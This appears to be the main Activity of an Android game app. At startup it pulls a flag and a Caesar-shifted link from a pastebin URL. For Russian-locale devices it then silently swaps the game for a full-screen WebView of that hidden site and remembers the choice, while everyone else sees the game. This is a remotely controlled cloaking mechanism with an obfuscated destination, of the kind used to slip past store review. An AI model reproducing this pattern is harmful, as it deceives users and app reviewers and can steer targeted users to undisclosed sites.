package mst.mysteryof.egyptest

import android.content.Intent
import android.content.pm.ActivityInfo
import android.os.Bundle
import androidx.annotation.ColorRes
import androidx.annotation.IdRes
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.navigation.NavController
import androidx.navigation.findNavController
import com.badlogic.gdx.backends.android.AndroidFragmentApplication
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.channels.BufferOverflow
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import mst.mysteryof.egyptest.databinding.ActivityMainBinding
import mst.mysteryof.egyptest.util.DataStoreManager
import mst.mysteryof.egyptest.util.Lottie
import mst.mysteryof.egyptest.util.Once
import mst.mysteryof.egyptest.util.internetConnection
import mst.mysteryof.egyptest.util.log
import mst.mysteryof.egyptest.util.webView.WebViewFragment
import okhttp3.OkHttpClient
import okhttp3.Request
import org.json.JSONObject
import java.io.IOException
import java.util.Locale
import kotlin.system.exitProcess

class MainActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {

    companion object {
        const val WEB_ID = 1000

        val startFragmentIdFlow = MutableSharedFlow<Int>(replay = 1, onBufferOverflow = BufferOverflow.DROP_OLDEST)
        var webUrl              = "https://google.com/"
    }

    private val coroutine = CoroutineScope(Dispatchers.Default)
    private val onceExit  = Once()

    private lateinit var binding : ActivityMainBinding
    private lateinit var navController: NavController

    lateinit var lottie          : Lottie

    val webViewFragment      = WebViewFragment(this)
    private val okHttpClient = OkHttpClient()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        initialize()

        if (internetConnection().not()) lottie.showNotInternet()
        else {
            asyncCheckInternetConnection()
            lottie.showLoader()

            coroutine.launch(Dispatchers.IO) {

                //startFragmentIdFlow.tryEmit(R.id.libGDXFragment)
                checkDataStore()

                launch(Dispatchers.Main) {
                    startFragmentIdFlow.collect { fragmentId ->
                        when (fragmentId) {
                            R.id.libGDXFragment -> {
//                                binding.root.also { rootCL ->
//                                    ConstraintSet().apply {
//                                        clone(rootCL)
//                                        constrainPercentWidth(binding.loader.id, .22f)
//                                        constrainPercentWidth(binding.internet.id, .22f)
//                                    }.applyTo(rootCL)
//                                }

                                webViewFragment.goneWebView()
                                setNavigationBarColor(R.color.botom)
                                setStartDestination(fragmentId)
                                ActivityInfo.SCREEN_ORIENTATION_PORTRAIT
                            }

                            WEB_ID -> {
                                webViewFragment.showAndOpenUrl()
                                setNavigationBarColor(R.color.white)
                                ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                            }

                            else                -> ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                        }.also { requestedOrientation = it }
                    }
                }
            }
        }
    }

    override fun onResume() {
        super.onResume()
        webViewFragment.onResume()
    }

    override fun onPause() {
        webViewFragment.onPause()
        super.onPause()
    }

    override fun exit() {
        onceExit.once {
            log("exit")
            coroutine.launch(Dispatchers.Main) {
                finishAndRemoveTask()
                delay(100)
                exitProcess(0)
            }
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        webViewFragment.onActivityResult(requestCode, resultCode, data)
    }

    private fun initialize() {
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        navController = findNavController(R.id.nav_host_fragment)
        lottie        = Lottie(binding)

        webViewFragment.onCreate(coroutine, binding.webStage)

    }

    // ---------------------------------------------------
    // Logic
    // ---------------------------------------------------

    private fun asyncCheckInternetConnection() {
        coroutine.launch(Dispatchers.Main) {
            while (isActive) {
                delay(3_000)
                if (internetConnection()) lottie.hideNotInternet() else lottie.showNotInternet()
            }
        }
    }

    private fun setStartDestination(@IdRes destinationId: Int) {
        navController.run { navInflater.inflate(R.navigation.nav_graph).apply { setStartDestination(destinationId) }.also { setGraph(it, null) } }
    }

    private fun setNavigationBarColor(@ColorRes colorId: Int) {
        coroutine.launch(Dispatchers.Main) {
            window.navigationBarColor = ContextCompat.getColor(this@MainActivity, colorId)
        }
    }

    private fun checkDataStore() {
        coroutine.launch(Dispatchers.IO) {
            when (DataStoreManager.Key.get()) {
                "WEB" -> {
                    DataStoreManager.Link.get()?.let {
                        log("DataStoreManager Key = WEB")
                        webUrl = it
                        startFragmentIdFlow.emit(WEB_ID)
                    }
                }
                "GAME" -> {
                    log("DataStoreManager Key = GAME")
                    startFragmentIdFlow.emit(R.id.libGDXFragment)
                }
                else -> {
                    log("DataStoreManager Key = NONE")
                    getResponse()
                }
            }
        }
    }

    private suspend fun getResponse() {
        val request: Request = Request.Builder().url("https://pastebin.com/raw/hpQPGtLM").build()

        try {
            okHttpClient.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    val json = JSONObject(response.body?.string() ?: "")
                    log("getResponse SUCCESS: $json")

                    val flag = json.getBoolean("isFlag")
                    val link = json.getString("link")

                    if (flag) {
                        if(Locale.getDefault().language == "ru") {
                            webUrl = decrypt(link, "123".length)
                            startFragmentIdFlow.tryEmit(WEB_ID)
                            DataStoreManager.Key.update { "WEB" }
                            DataStoreManager.Link.update { webUrl }

                        } else {
                            startFragmentIdFlow.tryEmit(R.id.libGDXFragment)
                            DataStoreManager.Key.update { "GAME" }
                        }
                    }
                    else startFragmentIdFlow.tryEmit(R.id.libGDXFragment)

                } else {
                    log("getResponse newCall FAIL: ${response.code} ${response.message}")
                    startFragmentIdFlow.tryEmit(R.id.libGDXFragment)
                }
            }
        } catch (e: IOException) {
            log("getResponse FAIL: $e")
            startFragmentIdFlow.tryEmit(R.id.libGDXFragment)
        }
    }

    fun encrypt(text: String, shift: Int): String {
        val result = StringBuilder()
        for (char in text) {
            if (char.isLetter()) {
                val shiftedChar = shiftChar(char, shift)
                result.append(shiftedChar)
            } else {
                result.append(char)
            }
        }
        return result.toString()
    }

    fun decrypt(text: String, shift: Int): String {
        return encrypt(text, -shift)
    }

    fun shiftChar(char: Char, shift: Int): Char {
        val isLowerCase = char.isLowerCase()
        val start = if (isLowerCase) 'a' else 'A'
        val end = if (isLowerCase) 'z' else 'Z'

        var shiftedChar = char + shift

        if (shiftedChar < start) {
            shiftedChar += 26
        } else if (shiftedChar > end) {
            shiftedChar -= 26
        }

        return shiftedChar
    }

}